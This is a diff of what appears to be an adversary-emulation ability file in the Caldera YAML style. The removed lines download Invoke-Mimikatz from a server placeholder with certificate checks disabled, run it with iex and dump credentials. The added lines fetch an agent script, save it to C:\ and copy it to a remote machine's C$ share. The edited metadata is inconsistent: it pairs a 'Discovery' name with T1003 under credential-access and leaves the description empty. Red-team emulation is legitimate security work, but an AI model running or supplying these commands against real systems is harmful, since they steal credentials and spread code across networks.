@@ -1,17 +1,18 @@
 ---
 
-- id: baac2c6d-4652-4b7e-ab0a-f1bf246edd12
-  name: Run PowerKatz
-  description: Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords
+- id: cdfa9d5b-571c-452e-bd0e-8d192a106799
+  name: CopyRAT (Alice)
+  description:
   tactic: credential-access
   technique:
     attack_id: T1003
-    name: Credential Dumping
+    name: Discovery
   executors:
     psh:
       command: |
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
         $web = (New-Object System.Net.WebClient)
-        $web.Headers.add("file","Invoke-Mimikatz-ps1")
+        $web.Headers.add("file","54ndc47.ps1")
         $result = $web.uploadString("#{server}/file/download","")
-        iex $result; Invoke-Mimikatz -DumpCreds
+        Set-Content -Path 'C:\54ndc47.ps1' -Value $result
+        cmd /c copy C:\54ndc47.ps1  \\#{remote.network.ip}\c$\54ndc47.ps1
